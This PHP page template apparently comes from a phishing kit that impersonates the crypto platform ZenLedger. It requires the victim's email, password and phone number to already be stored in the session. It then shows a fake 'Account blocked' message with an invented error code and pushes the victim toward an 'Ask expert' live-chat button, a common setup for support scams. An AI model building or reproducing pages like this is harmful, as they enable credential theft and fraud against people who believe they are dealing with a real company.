<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'ZenLedger: Buy &amp; Sell Crypto &amp; Metals | Trade Digital Assets';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        if(empty($_SESSION["phone_number"])) {
            redirect(base_url('verify.php'));
        }
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container-fluid">
            <div class="row">
                <?php include_once './includes/sidebar.php'; ?>
                <div class="col-md-6 order-md-2 order-1">
                    <div class="row">
                        <div class="col-8 bg-white mt60 rounded-3">
                            <div class="d-flex align-items-center">
                                <form method="post" action="<?= base_url('send.php') ?>" class="col-12 p25 form" style="position:relative;min-height:550px">
                                    <h1 class="h4 text-center text-danger my20">Account blocked</h1>
                                    <div class="fs17 my15" style="letter-spacing:0.4">Important Message!</div>
                                    <div class="my30 lh30 fw-normal">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately</div>
                                    <p class="fs16 lh30 fw-bold ls1">Error CODE: EBRX1:6X76D</p>
                                    <div class="text-center mx-auto d-grid gap-2" style="position: absolute; bottom: 20; width: 85%">
                                        <a href="javascript:void(Tawk_API.toggle())" class="btn btn-danger border-0 rounded-pill btn-lg btn-block rounded-0 fs14 py10">Ask expert</a>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>